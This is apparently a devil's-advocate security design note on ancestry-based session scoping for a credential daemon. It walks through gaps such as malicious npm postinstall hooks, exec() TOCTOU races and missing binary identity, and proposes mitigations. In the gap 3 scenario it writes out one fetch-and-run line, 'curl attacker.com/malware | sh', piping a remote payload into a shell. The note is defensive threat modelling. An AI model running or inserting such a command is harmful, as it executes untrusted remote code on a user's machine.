# vision: ancestry-based session scope — security gaps

## .purpose

devil's advocate analysis of the ancestry-based session scope approach. this document exposes fundamental gaps that remain even with ENFORCED ancestry verification.

---

## .gap 1: same-ancestry malware

### the problem

ancestry tracking verifies WHERE a process came from, not WHAT it is.

```
terminal (PID 1000) unlocks
  └── npm install (PID 1001)
        └── malicious postinstall hook (PID 1002, PPID=1001)
              └── connects to daemon
                    └── ancestry: 1002 → 1001 → 1000 ✓
                          └── GRANTED — malware has valid ancestry
```

### why this is fundamental

- the user ran `npm install` — that's a legitimate action
- npm spawns postinstall hooks — that's expected behavior
- malicious postinstall inherits the terminal's ancestry — kernel enforces this
- ancestry tracking CANNOT distinguish malicious descendant from legitimate one

### severity

**CRITICAL** — this is the primary attack vector for supply chain attacks, and ancestry tracking provides zero protection.

### mitigation?

- binary hash verification (but: TOCTOU)
- seccomp restrictions (but: must be applied by caller)
- sandboxed package execution (but: outside keyrack's scope)

**verdict**: ancestry tracking does not address same-ancestry attacks.

---

## .gap 2: exec() TOCTOU

### the problem

ancestry is verified at request time. process identity can change between verification and credential use.

```
t=0  legitimate tool connects (PID 1001, ancestry valid)
t=1  daemon verifies ancestry → PASS
t=2  daemon prepares credential response
t=3  tool exec()'s to malware (same PID 1001)
t=4  daemon sends credential to socket
t=5  malware receives credential
```

### why this is fundamental

- ancestry check passed at t=1
- process became malware at t=3
- same socket connection, same PID
- daemon cannot detect the exec()

### severity

**HIGH** — requires precise race timing, but automated tools exist to exploit TOCTOU.

### mitigation?

- verify ancestry on EVERY syscall (impractical)
- use kernel-level enforcement (eBPF-LSM)
- accept the risk (window is small)

**verdict**: TOCTOU is inherent to userspace verification. ancestry tracking does not eliminate it.

---

## .gap 3: no binary identity

### the problem

ancestry answers "is this process a descendant of the originator?" but not "is this process a trusted binary?"

```
scenario A: trusted
  terminal → bash → terraform → keyrack get
  ancestry valid ✓, binary trusted ✓

scenario B: untrusted but valid ancestry
  terminal → bash → curl attacker.com/malware | sh → keyrack get
  ancestry valid ✓, binary untrusted ✗
```

### why this is fundamental

- ancestry is about process tree position
- trustworthiness is about binary identity
- these are orthogonal properties
- ancestry tracking conflates "same tree" with "trusted"

### severity

**HIGH** — user can unknowingly run malicious commands that have valid ancestry.

### mitigation?

- combine with binary hash ACL (but: TOCTOU, hash management burden)
- user education (but: CONVENED)
- least-privilege credentials (limit blast radius)

**verdict**: ancestry is necessary but not sufficient for trust.

---

## .gap 4: shared terminal multiplexers

### the problem

tmux, screen, and similar tools create shared terminal sessions.

```
human A: tmux new -s shared
human B: tmux attach -t shared

both now share the same terminal process tree:
  tmux server (PID 1000)
    └── bash (PID 1001) — human A's shell
    └── bash (PID 1002) — human B's shell

if human A unlocks keyrack:
  daemon records originatorPid = 1001

human B's commands (descendants of 1000):
  └── PID 1003, ancestry: 1003 → 1002 → 1000
  └── does NOT pass through 1001
  └── REJECTED ✓ (correct behavior)

BUT if human A runs a command that human B can influence:
  └── shared environment, shared files, potential for abuse
```

### nuance

ancestry tracking actually handles the basic case correctly — human B's shell is not a descendant of human A's shell.

but shared environments create side channels:
- shared shell history
- shared environment variables
- shared files in /tmp
- human B could modify an executable that human A will run

### severity

**MEDIUM** — direct ancestry attack blocked, but side channels exist.

### mitigation?

- don't share terminal sessions with untrusted parties
- use separate tmux sessions per user

**verdict**: ancestry tracking is correct, but shared environments create adjacent risks.

---

## .gap 5: container and namespace boundaries

### the problem

process namespaces can hide or alter ancestry visibility.

```
host:
  terminal (PID 1000) unlocks keyrack
    └── docker run ... (PID 1001)

inside container:
  process sees itself as PID 1
  /proc/1/stat shows PPID = 0

daemon (on host):
  receives connection from containerized process
  SO_PEERCRED returns host PID (e.g., 1001)
  ancestry walk: 1001 → 1000 ✓
  GRANTED
```

### nuance

this actually WORKS for containers started from the terminal — they inherit ancestry on the host.

but:
- containers started by orchestrators (k8s, docker-compose) have different ancestry
- rootless containers may have different PID namespace mappings
- nested containers add complexity

### severity

**LOW to MEDIUM** — depends on container runtime and orchestration model.

### mitigation?

- keyrack daemon runs on host, verifies host-level ancestry
- container workloads should use service credentials, not user credentials

**verdict**: basic container case works, but complex orchestration needs care.

---

## .gap 6: long-lived sessions increase exposure

### the problem

the longer a session stays open, the larger the attack window.

```
t=0h   human unlocks with 9h TTL
t=1h   human takes lunch, leaves terminal open
t=2h   colleague uses terminal to "check one thing"
t=2.5h colleague runs malicious command (valid ancestry)
t=9h   session expires
```

### why this is fundamental

- ancestry tracking grants access to ALL descendants for the session duration
- longer sessions = more descendants = more attack surface
- no way to revoke specific descendants without ending the session

### severity

**MEDIUM** — mitigated by short TTL for sudo (30min), but regular credentials (9h) have larger window.

### mitigation?

- shorter TTLs (but: inconvenience)
- re-authentication for sensitive operations
- lock terminal when away

**verdict**: ancestry tracking has no per-descendant revocation.

---

## .gap 7: orphan reparent to init

### the problem

when a process's parent dies, the kernel reparents orphans to init (PID 1) or a subreaper.

```
t=0  terminal (PID 1000) unlocks
t=1  terminal spawns background job (PID 1001, PPID=1000)
t=2  terminal exits
t=3  kernel reparents: PID 1001 now has PPID=1
t=4  background job's children have ancestry: child → 1001 → 1
t=5  ancestry walk does NOT find 1000 anymore
```

### current behavior

the vision doc says "session ends when originator exits" — this is correct and intentional.

but: what if we WANTED orphans to retain access?

- they can't — their ancestry chain is broken
- no way to "remember" that 1001 was once a descendant of 1000

### severity

**LOW** — this is actually the DESIRED behavior for sudo credentials.

### edge case

if the originator is bash, and bash forks a subshell, and the subshell becomes the new "main" shell:
- original bash exits
- subshell is reparented
- session lost

**verdict**: orphan reparent is handled correctly (session ends), but can surprise users.

---

## .gap 8: daemon compromise

### the problem

if the daemon itself is compromised, all protections are bypassed.

```
attacker exploits vulnerability in daemon code
  └── daemon memory contains all credentials
  └── attacker reads credentials directly
  └── ancestry tracking is irrelevant
```

### why this is fundamental

- the daemon is a single point of trust
- all credentials pass through it
- ancestry tracking happens IN the daemon
- compromised daemon = game over

### severity

**CRITICAL** — but this is true for ANY daemon-based secret manager.

### mitigation?

- minimal daemon code surface
- memory-safe language (rust?)
- privilege separation
- short TTLs limit exposure window

**verdict**: daemon compromise is outside ancestry tracking's threat model, but worth noting.

---

## .gap 9: no audit trail of descendants

### the problem

ancestry tracking verifies access but doesn't log WHO accessed WHAT.

```
terminal unlocks
  └── 50 child processes over 9 hours
        └── which ones accessed credentials?
        └── daemon has no log of descendant PIDs
```

### why this matters

- incident response needs to know which processes accessed secrets
- compliance may require access logs
- a debug of "who used this credential?" is impossible

### severity

**MEDIUM** — operational gap, not security gap per se.

### mitigation?

- daemon logs every GET with caller PID, timestamp, ancestry chain
- integrate with audit subsystem

**verdict**: audit log should be added alongside ancestry tracking.

---

## .summary: what ancestry tracking does NOT protect against

| threat | protected? | why |
|--------|-----------|-----|
| cross-chain attack (browser extension) | ✓ YES | different ancestry |
| same-ancestry malware (npm postinstall) | ✗ NO | valid ancestry |
| exec() TOCTOU | ✗ NO | userspace verification |
| binary impersonation | ✗ NO | no binary identity check |
| shared terminal side channels | ✗ NO | side channels exist |
| long session exposure | ✗ NO | all descendants granted |
| orphan processes | ✓ YES | session ends (by design) |
| daemon compromise | ✗ NO | single point of trust |
| unaudited access | ✗ NO | no log by default |

---

## .the honest assessment

ancestry tracking provides **ENFORCED cross-chain isolation** — a real security win against browser extensions, vscode plugins, and cron jobs.

but it provides **ZERO protection** against:
- supply chain attacks (same-ancestry malware)
- TOCTOU races (exec after verify)
- insider threats (colleague at your terminal)

### the threat model it addresses

```
✓ opportunistic cross-session attacks
✓ accidental credential leakage to unrelated processes
✓ basic malware that runs in separate process trees
```

### the threat model it does NOT address

```
✗ targeted supply chain attacks
✗ sophisticated TOCTOU exploitation
✗ physical access / insider threats
✗ same-ancestry code execution
```

---

## .conclusion

ancestry tracking is a **meaningful layer of defense** but not a **complete security solution**.

it should be combined with:
- short TTLs (limit exposure window)
- audit log (know who accessed what)
- user education (don't run untrusted code)
- sandboxed execution (npm, pip in containers)
- least-privilege credentials (limit blast radius)

**the gap that hurts most**: same-ancestry malware. npm postinstall, pip setup.py, and similar vectors bypass ancestry tracking entirely.

